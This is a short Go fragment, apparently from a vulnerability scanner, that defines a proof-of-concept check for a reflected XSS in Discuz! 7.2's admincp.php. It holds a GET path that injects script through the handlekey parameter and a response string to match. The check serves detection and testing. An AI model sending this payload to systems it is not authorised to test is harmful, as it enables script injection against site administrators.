...
func (Info *PocInfo) Discuz_V72_admincp_XSS_Init() {
	poc := PocInfo{}
	...
	poc.Info.Type = "XSS"
	poc.Info.Name = "Discuz! 7.2 admincp.php reflect XSS"
	poc.Info.Level = 3
	...
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/admincp.php?infloat=yes&handlekey=123);test(700);//"}
	...
	poc.Poc.Data = []string{""}
	poc.Poc.Word = []string{"if($('return_123);test(700);//"}
